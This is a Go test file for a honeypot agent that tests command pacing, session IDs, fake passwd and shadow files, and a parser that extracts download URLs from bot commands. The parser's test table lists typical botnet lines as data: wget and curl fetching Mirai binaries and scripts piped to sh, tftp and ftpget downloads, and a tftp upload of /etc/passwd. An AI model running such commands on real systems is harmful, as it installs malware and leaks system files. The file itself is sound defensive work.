package services

import (
	"encoding/hex"
	"strings"
	"testing"
	"time"

	"honeypot-agent/internal/vfs"
)

// The pacer makes only a command that comes too soon wait. The numbers are written here, not taken
// from routerDelay, so a changed constant fails the test too.
func TestPacer(t *testing.T) {
	const slack = 50 * time.Millisecond // scheduling noise
	var p pacer
	took := func() time.Duration {
		start := time.Now()
		p.wait()
		return time.Since(start)
	}

	if d := took(); d > slack {
		t.Errorf("the first command waited %v (expected no wait)", d)
	}
	if d := took(); d < 200*time.Millisecond || d > 300*time.Millisecond+slack {
		t.Errorf("a command right after the previous one waited %v (expected 200-300ms)", d)
	}
	time.Sleep(400 * time.Millisecond) // whoever waits for the answer before sending the next command...
	if d := took(); d > slack {
		t.Errorf("a command sent 400ms later waited %v (expected no wait)", d) // ...never waits
	}
}

// downloadURL pulls the download URL out of typical bot lines: one with a scheme (stopping at shell
// separators and quotes), else what wget, tftp -g or ftpget would fetch without one.
func TestDownloadURL(t *testing.T) {
	tests := []struct {
		line string
		want string
	}{
		{"wget http://203.0.113.7/bins/mirai.arm7", "http://203.0.113.7/bins/mirai.arm7"},
		{"cd /tmp; wget http://203.0.113.7/x.sh; sh x.sh", "http://203.0.113.7/x.sh"},
		{"curl -s https://example.com/a.sh|sh", "https://example.com/a.sh"},
		{"busybox wget 'http://example.com/b'&&chmod +x b", "http://example.com/b"},
		{`curl "http://example.com/c"`, "http://example.com/c"},
		{"ftpget -v -u anonymous ftp://example.com/x", "ftp://example.com/x"},
		{"busybox tftp tftp://203.0.113.7/bot", "tftp://203.0.113.7/bot"},
		{"cat /proc/cpuinfo", ""},

		// without a scheme: BusyBox's wget takes it as http://
		{"cd /tmp; wget 203.0.113.7/bins.sh; chmod 777 bins.sh", "http://203.0.113.7/bins.sh"},
		{"wget -O /tmp/x -q 203.0.113.7:8080/y", "http://203.0.113.7:8080/y"},
		{"/bin/busybox wget -qO- 'example.com/i.sh'|sh", "http://example.com/i.sh"},
		{"nohup wget --user-agent Mozilla --tries=3 example.com/z &", "http://example.com/z"},
		{"wget -U x -T 5 -t 2 -P /tmp -Y off example.com/a", "http://example.com/a"},
		{"wget $IP/bins.sh", ""}, // only known when it runs
		{"wget -q", ""},
		{"wget HTTPS://example.com/a", ""}, // a scheme BusyBox refuses: nothing would be fetched
		{"cd /tmp || cd /var/run; busybox tftp -g -r mips 203.0.113.7; chmod +x mips", "tftp://203.0.113.7/mips"},
		{"tftp -l bot -r bins/arm7 -g 203.0.113.7 6969", "tftp://203.0.113.7:6969/bins/arm7"},
		{"tftp -g -l bot 203.0.113.7", "tftp://203.0.113.7/bot"},
		{"tftp -p -l /etc/passwd 203.0.113.7", ""}, // -p sends a file
		{"ftpget -v -u anonymous -p anonymous -P 2121 203.0.113.7 bins.sh bins/arm7", "ftp://203.0.113.7:2121/bins/arm7"},
		{"ftpget 203.0.113.7 x.sh", "ftp://203.0.113.7/x.sh"},
		{"ftpget 203.0.113.7", ""},
		{"echo wget; uname -a", ""},
	}
	for _, tt := range tests {
		if got := downloadURL(tt.line); got != tt.want {
			t.Errorf("%q: got %q, want %q", tt.line, got, tt.want)
		}
	}
}

// newSessionID: 16 hex characters, a different one every time.
func TestNewSessionID(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 1000; i++ {
		id := newSessionID()
		if _, err := hex.DecodeString(id); err != nil || len(id) != 16 {
			t.Fatalf("bad session id: %q", id)
		}
		if seen[id] {
			t.Fatalf("session id %q came out twice", id)
		}
		seen[id] = true
	}
}

// Persona rule: every user that can log in must be in the fake /etc/passwd with uid 0 and in
// /etc/shadow. Otherwise `cat /etc/passwd` right after a successful login gives us away.
func TestLoginUsersExistInFakeSystem(t *testing.T) {
	passwd, _, _ := vfs.NewShell().Run("cat /etc/passwd")
	shadow, _, _ := vfs.NewShell().Run("cat /etc/shadow")

	for credential := range weakCredentials {
		user, _, _ := strings.Cut(credential, ":")
		// "\n" in front so "root" can't match the end of another name, and the first line counts too
		if !strings.Contains("\n"+passwd, "\n"+user+":x:0:0:") {
			t.Errorf("user %q is missing from the fake /etc/passwd (or doesn't have uid 0)", user)
		}
		if !strings.Contains("\n"+shadow, "\n"+user+":") {
			t.Errorf("user %q is missing from the fake /etc/shadow", user)
		}
	}
}
